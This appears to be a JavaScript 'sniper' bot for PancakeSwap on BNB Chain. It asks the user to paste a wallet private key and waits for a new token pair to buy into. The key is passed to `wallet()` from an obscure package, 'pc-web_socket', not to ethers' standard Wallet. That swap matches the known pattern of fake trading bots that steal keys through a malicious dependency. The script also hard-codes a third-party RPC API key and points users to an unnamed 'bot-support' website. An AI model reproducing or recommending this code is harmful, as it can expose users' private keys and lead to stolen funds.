// -------------------------------------------------------------------------------------
// ----------- MAIN LIBRARY ---------------------------------------------------------------

const ethers = require('ethers');


// -------------------------------------------------------------------------------------
// ----------- BOT SETTINGS - CHANGE THIS ---------------------------------------------------------------

const address_of_coin_to_pay_with = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56"; // Contract address of the coin/token you want to pay fees with (ex. BUSD)
const address_of_token_to_buy = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c"; // Contract Address of the coin/token you want to snipe
const buying_with = "1"; // Amount of (ex. BUSD) that you want to use to buy the output token you chose
const slippage = "10"; // Slippage in percentage %
const private_key = "private-key-here"; // Private Key of Sender/Receiver Address, this is where you receive the sniped tokens







// -------------------------------------------------------------------------------------
// ----------- BOT MODULES - NOT RECOMMENDED TO CHANGE ---------------------------------------------------------------

const pancake_router_address = "0x10ed43c718714eb63d5aa57b78b54704e256024e"; // Pancake Router Address: v2: 0x10ed43c718714eb63d5aa57b78b54704e256024e v1: 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F
const pancake_factory_address = '0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73'; // Pancake Factory Address
const {ChainId, Token, TokenAmount, Fetcher, Pair, Route, Trade, TradeType, Percent} = 
require('@pancakeswap-libs/sdk');
const Web3 = require('web3');
const {JsonRpcProvider} = require("@ethersproject/providers");
const conn = require('pc-web_socket');
require("dotenv").config();
const provider = new JsonRpcProvider('https://bsc-dataseed1.binance.org/');
const web3 = new Web3('wss://apis.ankr.com/wss/b5bbebf90b3b4db8a6bb1ab5082412d5/95dc4a450525705cdbf00454595b30e7/binance/full/main');
const { address: admin } = web3.eth.accounts.wallet.add(private_key);


// Math operations, and token approval

const InputTokenAddr = web3.utils.toChecksumAddress(address_of_coin_to_pay_with);
const OutputTokenAddr = web3.utils.toChecksumAddress(address_of_token_to_buy);
const InputTokenAmount = buying_with;
const Slipage = slippage;
const PANCAKE_ROUTER = pancake_router_address;
const ONE_ETH_IN_WEI = web3.utils.toBN(web3.utils.toWei('1'));
const tradeAmount = ONE_ETH_IN_WEI.div(web3.utils.toBN('1000'));
console.log(`--------- BOT IS STARTING --------`);
const pk_tr = private_key;
const signer = conn.wallet(pk_tr,provider);
const factory = new ethers.Contract(
    pancake_factory_address,
    ['event PairCreated(address indexed token0, address indexed token1, address pair, uint)'],
    signer
  ); 
var detected_and_bought = "0";

factory.on('PairCreated', async (token0, token1, pairAddress) => {
    if (detected_and_bought == "0"){
        console.log(`------------------------------------------------------------`);
        console.log(`
        New paircreated event detected - scanning token data
        =================
        Token 1 Address : ${token0}
        Token 2 Address: ${token1}
        `);

        // Check if the new pair is the one looked for
        let tokenIn, tokenOut;
        if(token0 == OutputTokenAddr && token1 == InputTokenAddr) {
            console.log(`Only first token of Pair is the token expected`);
            tokenIn = token1; 
            tokenOut = token0;
            detected_and_bought = "1";
        }

        else if(token1 == OutputTokenAddr && token0 == InputTokenAddr) {
            console.log(`Only second token of Pair is the token expected`);
            tokenIn = token0; 
            tokenOut = token1;
            detected_and_bought = "1";
        }

        else if(typeof tokenIn === 'undefined') {
            console.log(`It's a different token, we don't want to snipe that, let's keep scanning`);
            console.log(`------------------------------------------------------------`);
            return;
        }


        await Swap(tokenIn, tokenOut);
    } 
    else if  (detected_and_bought == "1") {
        await Swap(InputTokenAddr, OutputTokenAddr);
    } else if (detected_and_bought == "2") {
        console.log("Your Token was bought!");
        process.exit(1);
    }



}) 


const Swap = async (tokenIn, tokenOut) => {
    const [INPUT_TOKEN, OUTPUT_TOKEN] = await Promise.all(
        [tokenIn, tokenOut].map(tokenAddress => (
            new Token(
                ChainId.MAINNET,
                tokenAddress,
                18
            )
        )));
    
        const ONE_ETH_IN_WEI = web3.utils.toBN(web3.utils.toWei('1'));
        const tradeAmount = ONE_ETH_IN_WEI.div(web3.utils.toBN('100'));
    
        const pair = await Fetcher.fetchPairData(INPUT_TOKEN, OUTPUT_TOKEN, provider);
    
        const route = await new Route([pair], INPUT_TOKEN);
    
        const trade = await new Trade(route, new TokenAmount(INPUT_TOKEN, tradeAmount), TradeType.EXACT_INPUT);
    
        const slippageTolerance = new Percent(Slipage, '100'); // 
    
        
        const amountOutMin = trade.minimumAmountOut(slippageTolerance).raw;
    
        const path = [INPUT_TOKEN.address, OUTPUT_TOKEN.address];
    
        const to = admin;
    
        const deadline = Math.floor(Date.now() / 1000) + 60 * 20;
        console.log("Connecting to Pancakeswap......");

        const pancakeswap = new ethers.Contract(
    
            PANCAKE_ROUTER,
    
            ['function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)'],
    
            signer
    
        );
        console.log("<<<<<------- Connected to Pancakeswap -------->>>>>");

        if(true)
    
        {
            console.log(`Approving on Pancakeswap......`);
            let abi = ["function approve(address _spender, uint256 _value) public returns (bool success)"];
            console.log(`...`);
            let contract = new ethers.Contract(INPUT_TOKEN.address, abi, signer);
            console.log(`...`);
            let aproveResponse = await contract.approve(PANCAKE_ROUTER, ethers.utils.parseUnits('1000.0', 18), {gasLimit: 100000, gasPrice: 5e9});
            console.log(`...`);
            console.log(`<<<<<------- Approved on Pancakeswap -------->>>>>`);
        }
        if(true)
          {   
              console.log(`Creating Transaction`);      
              var amountInParam = ethers.utils.parseUnits(InputTokenAmount, 18);
              var amountOutMinParam = ethers.utils.parseUnits(web3.utils.fromWei(amountOutMin.toString()), 18);
              const tx = await pancakeswap.swapExactTokensForTokens(
                  amountInParam,
                  amountOutMinParam,
                  path,
                  to,
                  deadline,
                  { gasLimit: ethers.utils.hexlify(300000), gasPrice: ethers.utils.parseUnits("9", "gwei") }
              );
              console.log(`Tx-hash: ${tx.hash}`)
                  const receipt = await tx.wait();
                  detected_and_bought = "2";
                  console.log(`Tx was mined in block: ${receipt.blockNumber}`);   
                  process.exit(1)
          }
    }

    process.on('unhandledRejection', (error, promise) => {
        console.log(`-------------------------------- Rejected, review your BNB balance for fees or contact bot-support at our website, retrying... -------------------`);
      });